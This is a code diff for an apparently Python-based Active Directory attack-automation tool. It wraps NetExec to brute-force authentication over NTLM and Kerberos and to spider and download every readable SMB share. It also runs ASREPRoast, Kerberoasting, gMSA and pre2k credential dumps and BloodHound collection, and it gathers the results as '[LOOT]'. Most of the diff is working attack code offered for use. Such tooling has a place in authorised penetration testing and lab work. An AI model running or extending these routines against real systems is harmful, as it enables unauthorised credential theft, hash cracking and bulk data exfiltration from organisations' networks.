@@ -174,7 +174,29 @@ def build_output_filename(tool, username, command_name):
     return f"{tool}_{safe_user}_{command_name}.txt"
 
 
-def run_bober_exec(target_ip, username, password):
+def build_nxc_base_cmd(protocol, target_ip, username, password, dc_host, auth_type):
+
+    username = username or ""
+    password = password or ""
+
+    cmd = [
+        "nxc", protocol, target_ip,
+        "-u", username,
+        "-p", password,
+        "--dns-server", target_ip,
+        "--dns-tcp",
+        "--dns-timeout", "3",
+        "--kdcHost", dc_host
+    ]
+
+    if auth_type == "kerberos":
+        cmd.append("-k")
+
+    return cmd
+
+
+def run_bober_exec(target_ip, username, password, dc_host=None, kerberos=False):
+
     base_cmd = [
         "bober-exec",
         "-f", "nmap_all-ports_basic-info_TCP.txt",
@@ -182,6 +204,13 @@ def run_bober_exec(target_ip, username, password):
     ]
 
     cmd_string = f"-u '{username}' -p '{password}' --threads 1 --timeout 3"
+
+    if dc_host:
+        cmd_string += f" --dns-server {target_ip} --dns-tcp --kdcHost {dc_host}"
+
+    if kerberos:
+        cmd_string += " -k"
+
     full_cmd = base_cmd + ["-c", cmd_string]
 
     result = subprocess.run(full_cmd, capture_output=True, text=True)
@@ -210,7 +239,7 @@ def parse_bober_exec_output(output):
         if len(parts) < 1:
             continue
 
-        service = parts[0].lower()
+        service = re.sub(r'[^a-z]', '', parts[0].lower())
 
         # Csak ismert service nevekkel dolgozunk
         if service not in ["smb", "ldap", "rpc", "winrm", "mssql", "rdp", "vnc", "ftp", "nfs"]:
@@ -240,42 +269,101 @@ def evaluate_services(parsed_results):
 
     return valid_services
 
-def attempt(target_ip, user, pwd, label, create_smb_report):
-    print(f"\n[*] Trying: {label}")
 
-    output = run_bober_exec(target_ip, user, pwd)
+def attempt(target_ip, user, pwd, label, create_smb_report, dc_host):
+
+    print(f"\n-----------------------------")
+    print(f"[*] TRYING: {label}")
+    print(f"-----------------------------\n")
+    # ---------------------------
+    # NTLM RUN
+    # ---------------------------
+    output = run_bober_exec(target_ip, user, pwd, dc_host, kerberos=False)
 
     parsed = parse_bober_exec_output(output)
-    candidate_services = evaluate_services(parsed)
-
-    if not candidate_services:
-        print("[-] No candidate services detected.")
-        return {}
-
-    print(f"[+] Candidate services: {', '.join(candidate_services)}")
+    ntlm_services = evaluate_services(parsed)
 
     results = {}
 
-    for service in candidate_services:
+    if ntlm_services:
+        print(f"[+] NTLM success: {', '.join(ntlm_services)}")
 
-        # ===== LDAP BLOCK =====
+        for service in ntlm_services:
+            results[service] = {
+                "auth_type": "ntlm"
+            }
+
+    # ---------------------------
+    # Detect failed services
+    # ---------------------------
+    tested_services = parsed.keys()
+    failed_services = [s for s in tested_services if s not in ntlm_services]
+
+    # ---------------------------
+    # Kerberos retry
+    # ---------------------------
+    if failed_services:
+
+        print("[*] Retrying failed services with Kerberos...")
+
+        output = run_bober_exec(target_ip, user, pwd, dc_host, kerberos=True)
+
+        parsed = parse_bober_exec_output(output)
+        kerberos_services = evaluate_services(parsed)
+
+        for service in kerberos_services:
+
+            if service not in results:
+
+                print(f"[+] Kerberos success: {service}")
+
+                results[service] = {
+                    "auth_type": "kerberos"
+                }
+
+    if not results:
+        print("[-] No successful authentication.")
+        return {}
+
+    # ---------------------------
+    # Execute service modules
+    # ---------------------------
+    final_results = {}
+
+    for service, meta in results.items():
+
+        auth_type = meta["auth_type"]
+
+        print(f"\n[+] Executing {service} modules (auth: {auth_type})")
+
         if service == "ldap":
-            execute_ldap_block(target_ip, user, pwd)
-            results[service] = "executed"
+
+            execute_ldap_block(target_ip, user, pwd, dc_host, auth_type)
+            final_results[service] = auth_type
             continue
-            
-        service_results = execute_service(service, target_ip, user, pwd)
-        results[service] = service_results
 
-        # ===== SMB-REPORT BLOCK =====
-        if service == "smb":
-            if create_smb_report:
-                execute_smb_report(target_ip, user, pwd)
+        service_results = execute_service(service, target_ip, user, pwd, dc_host, auth_type)
 
-    return results
+        if service_results is not None:
+            final_results[service] = {
+                "auth_type": auth_type,
+                "results": service_results
+            }
+
+        if service == "smb" and create_smb_report:
+            execute_smb_report(target_ip, user, pwd, dc_host, auth_type)
+
+    return final_results
 
 
-def execute_windows_strategy(target_ip, username, password, skip_passwordless, create_smb_report):
+def execute_windows_strategy(
+    target_ip,
+    username,
+    password,
+    skip_passwordless,
+    create_smb_report,
+    dc_host
+):
     print("\n[+] Starting Windows credential strategy...")
 
     overall_results = {}
@@ -292,7 +380,7 @@ def execute_windows_strategy(target_ip, username, password, skip_passwordless, c
         print("[*] Skipping anonymous and guest rounds (--skip-passwordless-users)")
 
     for label, user, pwd in credential_rounds:
-        results = attempt(target_ip, user, pwd, label, create_smb_report)
+        results = attempt(target_ip, user, pwd, label, create_smb_report, dc_host)
         overall_results[label] = results
 
     # ==============================
@@ -317,100 +405,41 @@ def execute_windows_strategy(target_ip, username, password, skip_passwordless, c
     print("\n[+] Windows credential testing completed.\n")
 
 
-def build_rpc_commands(target_ip, username, password):
+def build_smb_commands(target_ip, username, password, dc_host, auth_type):
+
     username = username or ""
     password = password or ""
 
-    base = [
-        "rpcclient",
+    base_cmd = build_nxc_base_cmd(
+        "smb",
         target_ip,
-        f"--user={username}",
-        f"--password={password}",
-        "--client-protection=off"
-    ]
-
-    return [
-        {
-            "name": "enumdomusers",
-            "cmd": base + ["--command=enumdomusers"],
-            "parser": parse_rpc_enumdomusers
-        },
-        {
-            "name": "netshareenumall",
-            "cmd": base + ["--command=netshareenumall"],
-            "parser": None  # raw save
-        }
-    ]
-
-
-def detect_rpc_error(output):
-    upper = output.upper()
-
-    if "ACCESS_DENIED" in upper:
-        return True, "ACCESS_DENIED"
-
-    if "NT_STATUS_ACCESS_DENIED" in upper:
-        return True, "NT_STATUS_ACCESS_DENIED"
-
-    if "WERR_ACCESS_DENIED" in upper:
-        return True, "WERR_ACCESS_DENIED"
-
-    return False, None
-
-
-def parse_rpc_enumdomusers(output):
-    users = []
-
-    for line in output.splitlines():
-        match = re.search(r"user:\[(.*?)\]", line)
-        if match:
-            users.append(match.group(1))
-
-    return users
-
-
-def dump_smb_shares(target_ip, username, password, parsed_shares):
-
-    for share in parsed_shares:
-        dump_smb_share(target_ip, share, username, password)
-
-
-def build_smb_commands(target_ip, username, password):
-    username = username or ""
-    password = password or ""
+        username,
+        password,
+        dc_host,
+        auth_type
+    )
 
     return [
         {
             "name": "shares",
-            "cmd": ["nxc", "smb", target_ip, "-u", username, "-p", password, "--shares"],
-            "parser": parse_smb_shares,
-            "post_process": dump_smb_shares  # új mező
+            "cmd": base_cmd + ["--shares"],
+            "post_process": dump_smb_shares
         },
         {
             "name": "rid_brute",
-            "cmd": ["nxc", "smb", target_ip, "-u", username, "-p", password, "--rid-brute"],
+            "cmd": base_cmd + ["--rid-brute"],
             "parser": parse_smb_rid_brute
         },
         {
             "name": "users_export",
-            "cmd": [
-                "nxc", "smb", target_ip,
-                "-u", username,
-                "-p", password,
-                "--users-export", "users.txt"
-            ],
+            "cmd": base_cmd + ["--users-export", "users.txt"],
             "parser": None,
             "success_condition": "file",
             "produced_file": "users.txt"
         },
         {
             "name": "pass_pol",
-            "cmd": [
-                "nxc", "smb", target_ip,
-                "-u", username,
-                "-p", password,
-                "--pass-pol"
-            ],
+            "cmd": base_cmd + ["--pass-pol"],
             "success_condition": "contains",
             "success_marker": "Dumping password info for domain"
         }
@@ -441,97 +470,62 @@ def parse_smb_rid_brute(output):
     return users
 
 
-def parse_smb_shares(output):
-    shares = []
-    ignore_shares = {"ADMIN$", "C$", "IPC$"}
-
-    lines = output.splitlines()
-    start_parsing = False
-
-    for line in lines:
-
-        # Keressük a header sort
-        if "Share" in line and "Permissions" in line:
-            start_parsing = True
-            continue
-
-        if not start_parsing:
-            continue
-
-        if "-----" in line:
-            continue
-
-        # Ha már nem SMB sor, skip
-        if not line.strip().startswith("SMB"):
-            continue
-
-        parts = line.split()
-
-        # Minimum 6 oszlop kell
-        if len(parts) < 6:
-            continue
-
-        # A share név stabilan az 5. indexen van
-        # (SMB IP PORT HOST SHARE ...)
-        share_name = parts[4]
-
-        permissions = None
-        if len(parts) >= 6:
-            permissions = parts[5]
-
-        if share_name in ignore_shares:
-            continue
-
-        if permissions and "READ" in permissions.upper():
-            shares.append(share_name)
-
-    return shares
-
-
-def dump_smb_share(target_ip, share, username, password):
+def dump_smb_shares(target_ip, username, password, dc_host):
 
     safe_user = username if username else "anonymous"
-    directory = f"smb_{safe_user}_{share}_content"
 
-    os.makedirs(directory, exist_ok=True)
+    smb_dumps_folder = "smb_share_dumps"
+    os.makedirs(smb_dumps_folder, exist_ok=True)
+
+    print("[+] Starting SMB spider (NetExec spider_plus)...")
 
     cmd = [
-        "smbclient",
-        f"//{target_ip}/{share}",
-        f"--user={username}",
-        f"--password={password}",
-        "--client-protection=off",
-        "-c",
-        "recurse on;prompt off;mget *"
+        "nxc",
+        "smb",
+        target_ip,
+        "-M", "spider_plus",
+        "-o",
+        "EXCLUDE_FILTER='print$,ipc$,c$'",
+        "OUTPUT_FOLDER=smb_share_dumps",
+        "DOWNLOAD_FLAG=True",
+        "-u", username,
+        "-p", password
     ]
 
+    if dc_host:
+        cmd += [
+            "--dns-server", target_ip,
+            "--dns-tcp",
+            "--kdcHost", dc_host
+        ]
+
     print(f"\033[1m\033[36m[CMD]\033[0m {' '.join(cmd)}")
-    print(f"[+] Dumping share '{share}' into {directory}")
 
     result = subprocess.run(
         cmd,
-        cwd=directory,
         capture_output=True,
         text=True
     )
 
-    if "NT_STATUS_ACCESS_DENIED" in result.stdout.upper():
-        print(f"[-] Access denied on share {share}")
+    output = result.stdout.upper()
+
+    if "ACCESS_DENIED" in output or "STATUS_ACCESS_DENIED" in output:
+        print("[-] SMB spider encountered access denied errors.")
         return False
 
-    print(f"[+] Share {share} dumped successfully")
+    print("\033[1m\033[32m[LOOT]\033[0m SMB spider completed.")
     return True
 
 
-def execute_service(service, target_ip, username, password):
+def execute_service(service, target_ip, username, password, dc_host, auth_type):
     if service not in SERVICE_EXECUTORS:
-        print(f"[!] No executor defined for {service}")
-        return {}
+        print(f"[*] No executor implemented for service '{service}'. Skipping.")
+        return None
 
     print(f"\n[+] Executing {service} modules...")
 
     executor = SERVICE_EXECUTORS[service]
-    commands = executor["command_builder"](target_ip, username, password)
+    commands = executor["command_builder"](target_ip, username, password, dc_host, auth_type)
     error_detector = executor["error_detector"]
 
     service_results = {}
@@ -607,14 +601,14 @@ def execute_service(service, target_ip, username, password):
 
             print(f"[+] Parsed output saved to {filename}")
 
-            if post_process:
-                post_process(target_ip, username, password, parsed_data)
-
         else:
             with open(filename, "w") as f:
                 f.write(output)
 
             print(f"[+] Raw output saved to {filename}")
+
+        if post_process:
+            post_process(target_ip, username, password, dc_host)
 
         service_results[name] = "success"
 
@@ -622,10 +616,7 @@ def execute_service(service, target_ip, username, password):
 
 
 SERVICE_EXECUTORS = {
-    "rpc": {
-        "command_builder": build_rpc_commands,
-        "error_detector": detect_rpc_error
-    },
+
     "smb": {
         "command_builder": build_smb_commands,
         "error_detector": detect_smb_error
@@ -647,20 +638,77 @@ LDAP_COMMANDS = [
     {"name": "Entra ID", "args": ["-M", "entra-id"]},
     {"name": "Password Settings Objects", "args": ["--pso"]},
     {"name": "gMSA Dump", "args": ["--gmsa"]},
+
     {"name": "Machine Account Quota", "args": ["-M", "maq"]},
+    {"name": "pre2k", "args": ["-M", "pre2k"]},
 
     {"name": "ASREPRoast", "args": ["--asreproast", "asreproast.txt"]},
     {"name": "Kerberoasting", "args": ["--kerberoasting", "kerberoasting.txt"]},
 
-    {"name": "Bloodhound Collection", "args": ["--bloodhound", "--collection", "All"], "bloodhound": True}
+    {"name": "Bloodhound Collection", "args": ["--bloodhound", "--collection", "All"]}
 ]
 
-def execute_ldap_block(target_ip, username, password):
+
+def handle_ldap_loot(name, output):
+
+    # ===== BLOODHOUND ZIP HANDLING =====
+    if name == "Bloodhound Collection" and "Compressing output into" in output:
+
+        match = re.search(r"Compressing output into (.+\.zip)", output)
+        if match:
+            zip_path = match.group(1).strip()
+
+            if os.path.exists(zip_path):
+                destination = os.path.basename(zip_path)
+                shutil.move(zip_path, destination)
+
+                print(f"\033[1m\033[32m[LOOT]\033[0m Bloodhound zip moved to current directory: {destination}")
+            else:
+                print("[!] Bloodhound zip path found but file missing.")
+
+    # ===== PRE2K CONTENT HANDLING =====
+    if name == "pre2k" and re.search(r"Saved to .*\.nxc/modules/pre2k/.*", output):
+        
+        src_base = os.path.expanduser("~/.nxc/modules/pre2k")
+        dst_base = "pre2k"
+
+        if not os.path.exists(src_base):
+            return
+
+        for root, dirs, files in os.walk(src_base):
+
+            rel_path = os.path.relpath(root, src_base)
+            target_dir = os.path.join(dst_base, rel_path)
+
+            os.makedirs(target_dir, exist_ok=True)
+
+            for file in files:
+
+                src = os.path.join(root, file)
+                dst = os.path.join(target_dir, file)
+
+                try:
+                    shutil.move(src, dst)
+                    print(f"\033[1m\033[32m[LOOT]\033[0m PRE2K output moved to current directory: {dst}")
+                except Exception:
+                    pass
+
+
+def execute_ldap_block(target_ip, username, password, dc_host, auth_type):
 
     safe_user = username if username else "anonymous"
     output_filename = f"ldap_{safe_user}_output.txt"
 
     print("\n[+] Starting LDAP enumeration block...\n")
+
+    base_cmd = build_nxc_base_cmd(
+        "ldap",
+        target_ip,
+        username,
+        password,
+        dc_host,
+        auth_type
+    )
 
     with open(output_filename, "w") as report:
 
@@ -668,24 +716,13 @@ def execute_ldap_block(target_ip, username, password):
 
             name = entry["name"]
             args = entry["args"]
-            is_bloodhound = entry.get("bloodhound", False)
 
             print(f"[LDAP] Running: {name}")
 
-            cmd = [
-                "nxc", "ldap", target_ip,
-                "-u", username,
-                "-p", password
-            ] + args
-
-            # DNS server hozzáadás ha kell
-            if "--asreproast" in args or "--kerberoasting" in args or is_bloodhound:
-                cmd += ["--dns-server", target_ip]
+            cmd = base_cmd + args
 
             result = subprocess.run(cmd, capture_output=True, text=True)
             output = result.stdout
-
-            # ===== REPORT FORMATTING =====
 
             report.write("\n")
             report.write("=" * 80 + "\n")
@@ -695,23 +732,11 @@ def execute_ldap_block(target_ip, username, password):
             report.write(output)
             report.write("\n")
 
-            # ===== BLOODHOUND ZIP HANDLING =====
+            # LDAP loot kezelése
+            handle_ldap_loot(name, output)
 
-            if is_bloodhound and "Compressing output into" in output:
+    print(f"\n\033[1m\033[35m[REPORT]\033[0m LDAP report saved to {output_filename}\n")
 
-                match = re.search(r"Compressing output into (.+\.zip)", output)
-                if match:
-                    zip_path = match.group(1).strip()
-
-                    if os.path.exists(zip_path):
-                        destination = os.path.basename(zip_path)
-                        shutil.move(zip_path, destination)
-
-                        print(f"[+] Bloodhound zip moved to current directory: {destination}")
-                    else:
-                        print("[!] Bloodhound zip path found but file missing.")
-
-    print(f"\n[+] LDAP report saved to {output_filename}\n")
 
 SMB_REPORT_COMMANDS = [
     # ENUMERATION
@@ -766,12 +791,52 @@ SMB_REPORT_COMMANDS = [
     {"name": "WinSCP", "args": ["-M", "winscp"]},
 ]
 
-def execute_smb_report(target_ip, username, password):
+
+def collect_nxc_logs():
+
+    src_base = os.path.expanduser("~/.nxc/logs")
+    dst_base = "nxc_logs"
+
+    if not os.path.exists(src_base):
+        return
+
+    for root, dirs, files in os.walk(src_base):
+
+        rel_path = os.path.relpath(root, src_base)
+        target_dir = os.path.join(dst_base, rel_path)
+
+        os.makedirs(target_dir, exist_ok=True)
+
+        for file in files:
+
+            src = os.path.join(root, file)
+            dst = os.path.join(target_dir, file)
+
+            try:
+                shutil.move(src, dst)
+                print(f"\033[1m\033[32m[LOOT]\033[0m NXC logs moved to current directory: {dst}")
+            except Exception:
+                pass
+
+
+def execute_smb_report(target_ip, username, password, dc_host, auth_type):
 
     safe_user = username if username else "anonymous"
     output_filename = f"smb_{safe_user}_report.txt"
 
     print("\n[+] Starting extended SMB report (requires high privileges)...\n")
+
+    base_cmd = build_nxc_base_cmd(
+        "smb",
+        target_ip,
+        username,
+        password,
+        dc_host,
+        auth_type
+    )
+
+    if auth_type == "kerberos":
+        base_cmd.append("-k")
 
     with open(output_filename, "w") as report:
 
@@ -782,11 +847,7 @@ def execute_smb_report(target_ip, username, password):
 
             print(f"[SMB-REPORT] Running: {name}")
 
-            cmd = [
-                "nxc", "smb", target_ip,
-                "-u", username,
-                "-p", password
-            ] + args
+            cmd = base_cmd + args
 
             result = subprocess.run(cmd, capture_output=True, text=True)
             output = result.stdout
@@ -798,7 +859,8 @@ def execute_smb_report(target_ip, username, password):
             report.write(output)
             report.write("\n")
 
-    print(f"\n[+] SMB extended report saved to {output_filename}\n")
+    collect_nxc_logs()
+    print(f"\n\033[1m\033[35m[REPORT]\033[0m SMB extended report saved to {output_filename}\n")
 
 
 def is_valid_domain(domain):
@@ -1188,7 +1250,7 @@ def update_hosts_file(target_ip, domains):
         stdout=subprocess.DEVNULL
     )
 
-    print("[+] Hosts file updated successfully.")
+    print("\033[1m\033[37m[+] Hosts file updated successfully.\033[0m")
 
 
 # -----------------------------
@@ -1247,7 +1309,7 @@ def build_validated_web_targets(web_map, target_ip):
         for port in data["ports"]:
             for scheme in data["schemes"]:
 
-                print(f"\033[1m\033[37m[CHECK]\033[0m {scheme}://{host}:{port}")
+                print(f"[CHECK] {scheme}://{host}:{port}")
 
                 if validate_web_target(scheme, target_ip, host, port):
                     print("  [+] Valid web service confirmed")
@@ -1927,6 +1989,39 @@ def print_sub_section_title(title, color_code="36"):
     print("-" * (len(title) + 6))  # vizuális elválasztó
 
 
+    # --------------------------------
+    # AD_time_sync
+    # --------------------------------
+def sync_time_with_dc(dc_host, auto_mode):
+
+    if not dc_host:
+        print("[*] No Domain Controller hostname discovered. Skipping time sync.")
+        return
+
+    print("\n\033[1m\033[37m[!] Kerberos authentication is sensitive to time drift.\033[0m")
+    print("\033[1m\033[37m[!] Synchronizing system time with the Domain Controller improves reliability.\033[0m\n")
+
+    if not ask_user(
+        f"Synchronize system time with DC ({dc_host})? [y/N]: ",
+        default="yes",
+        auto_mode=auto_mode
+    ):
+        print("[*] Skipping time synchronization.")
+        return
+
+    print(f"\n[*] Syncing time with {dc_host}")
+
+    subprocess.run(["sudo", "timedatectl", "set-ntp", "false"])
+
+    subprocess.run([
+        "sudo",
+        "rdate",
+        "-nv",
+        dc_host
+    ])
+
+    print("\033[1m\033[37m[+] Time synchronization completed.\033[0m\n")
+
 # -----------------------------
 # MAIN
 # -----------------------------
@@ -2034,9 +2129,9 @@ def main():
             for d in sorted(global_domains):
                 print(f"  - {d}")
 
-            print("\n[!] Updating /etc/hosts may affect how Nmap resolves and fingerprints services.")
-            print("    If you choose to update the hosts file, do NOT rerun this tool with Nmap scanning enabled.")
-            print("    Instead, use the -sn / --skip-nmap option to avoid inconsistent scan results.\n")
+            print("\n\033[1m\033[37m[!] Updating /etc/hosts may affect how Nmap resolves and fingerprints services.\033[0m")
+            print("    \033[1m\033[37mIf you choose to update the hosts file, do NOT rerun this tool with Nmap scanning enabled.\033[0m")
+            print("    \033[1m\033[37mInstead, use the -sn / --skip-nmap option to avoid inconsistent scan results.\033[0m\n")
 
             if ask_user(
                 "Do you want to update /etc/hosts with the discovered domains? [y/N]: ",
@@ -2061,7 +2156,29 @@ def main():
             print("\n[*] No strong Windows indicators detected.")
 
         if windows_likely:
-            execute_windows_strategy(target_ip, username, password, args.skip_passwordless_users, args.create_smb_report)
+
+            dc_host = None
+            dns_domain = None
+
+            if ad_core:
+                dns_domain = ad_core.get("dns_domain")
+
+                if ad_core.get("dc_hosts"):
+                    dc_host = next(iter(ad_core["dc_hosts"]))
+
+            if not dc_host:
+                print("[*] No Domain Controller discovered.")
+
+            sync_time_with_dc(dc_host, auto_mode)
+
+            execute_windows_strategy(
+                target_ip,
+                username,
+                password,
+                args.skip_passwordless_users,
+                args.create_smb_report,
+                dc_host
+            )
 
         # WEB VALIDATION PHASE
         # --- Web Service & Application Enumeration ---
